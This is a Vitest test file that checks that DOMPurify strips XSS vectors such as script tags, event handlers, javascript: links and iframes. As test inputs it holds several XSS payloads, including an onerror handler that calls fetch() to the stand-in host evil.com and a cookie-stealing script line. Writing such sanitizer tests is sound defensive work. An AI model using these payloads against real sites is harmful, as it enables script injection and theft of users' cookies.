import DOMPurify from 'isomorphic-dompurify';
import { describe, it, expect } from 'vitest';

describe('XSS Prevention', () => {
  describe('script injection', () => {
    it('strips script tags', () => {
      const sanitized = DOMPurify.sanitize('<script>alert(1)</script>');
      expect(sanitized).not.toContain('<script');
      expect(sanitized).toBe('');
    });

    it('strips event handler attributes', () => {
      const payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<div onmouseover="alert(1)">hover</div>',
      ];
      for (const payload of payloads) {
        const sanitized = DOMPurify.sanitize(payload);
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('onmouseover');
      }
    });

    it('strips javascript: from href attributes', () => {
      const sanitized = DOMPurify.sanitize('<a href="javascript:alert(1)">click</a>');
      expect(sanitized).not.toContain('javascript:');
    });
  });

  it('preserves safe HTML', () => {
    const safeHtml = '<p>Hello <strong>World</strong></p>';
    expect(DOMPurify.sanitize(safeHtml)).toBe(safeHtml);
  });

  it('handles quote field content safely', () => {
    // Script tags are fully stripped
    const title = DOMPurify.sanitize('Web Dev <script>steal(cookies)</script>');
    expect(title).not.toContain('<script');
    expect(title).toBe('Web Dev ');

    // Event handlers are removed
    const notes = DOMPurify.sanitize('<img src=x onerror="fetch(\'evil.com\')">');
    expect(notes).not.toContain('onerror');

    // onclick handlers are removed
    const terms = DOMPurify.sanitize('<a href="javascript:void(0)" onclick="alert(1)">Terms</a>');
    expect(terms).not.toContain('onclick');
    expect(terms).not.toContain('javascript:');
  });

  it('strips iframe injection', () => {
    const sanitized = DOMPurify.sanitize('<iframe src="https://evil.com"></iframe>');
    expect(sanitized).not.toContain('<iframe');
  });
});
